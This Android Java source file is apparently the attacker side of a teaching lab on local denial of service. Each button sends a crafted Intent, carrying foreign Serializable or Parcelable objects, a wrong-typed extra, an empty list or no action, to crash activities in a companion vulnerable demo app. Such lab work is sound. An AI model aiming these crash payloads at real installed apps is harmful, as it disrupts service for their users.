package com.example.denialserviceattack;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;

import androidx.appcompat.app.AppCompatActivity;

import java.math.BigInteger;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {
    private Button btnSerial;
    private Button btnParcel;
    private Button btnSafeSerial;
    private Button btnString;

    private Button btnArrayList, btnClassCast, btnIntentGetAction;

    private static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initViews();
        initListeners();
    }

    private void initListeners() {
        btnSerial.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setClassName("com.example.denialserviceapp", "com.example.denialserviceapp.SerialActivity");
//            intent.putExtra("user", new SUser());
            intent.putExtra("data", new SUser());   // 无论key值是否与漏洞应用相同，均可以实现攻击目的
            startActivity(intent);

        });
        btnParcel.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setClassName("com.example.denialserviceapp", "com.example.denialserviceapp.ParcelActivity");
            intent.putExtra("user", new PUser());
            startActivity(intent);
        });
        btnSafeSerial.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setClassName("com.example.denialserviceapp", "com.example.denialserviceapp.SafeSerialActivity");
            intent.putExtra("user", new SUser());
            startActivity(intent);
        });
        btnString.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setClassName("com.example.denialserviceapp", "com.example.denialserviceapp.StringActivity");
            intent.putExtra("data", new SUser());
            startActivity(intent);
        });

        btnIntentGetAction.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setClassName("com.example.denialserviceapp", "com.example.denialserviceapp.IntentGetActionActivity");
            //intent.setAction("a");
            startActivity(intent);
        });
        btnClassCast.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setClassName("com.example.denialserviceapp", "com.example.denialserviceapp.ClassCastActivity");
            intent.putExtra("serializable_key", BigInteger.valueOf(1));
            startActivity(intent);
        });

        btnArrayList.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setClassName("com.example.denialserviceapp", "com.example.denialserviceapp.ArrayListActivity");
            ArrayList<Integer> userIds = new ArrayList<>();
//            userIds.add(123);
//            userIds.add(456);
            intent.putIntegerArrayListExtra("user_id", userIds);
            startActivity(intent);
        });
    }

    private void initViews() {
        btnSerial = findViewById(R.id.btn_serial);
        btnParcel = findViewById(R.id.btn_parcel);
        btnSafeSerial = findViewById(R.id.btn_safe_serial);
        btnString = findViewById(R.id.btn_string);
        btnIntentGetAction = findViewById(R.id.btn_intent_get_action);
        btnArrayList = findViewById(R.id.btn_arraylist);
        btnClassCast = findViewById(R.id.btn_classcast);
    }
}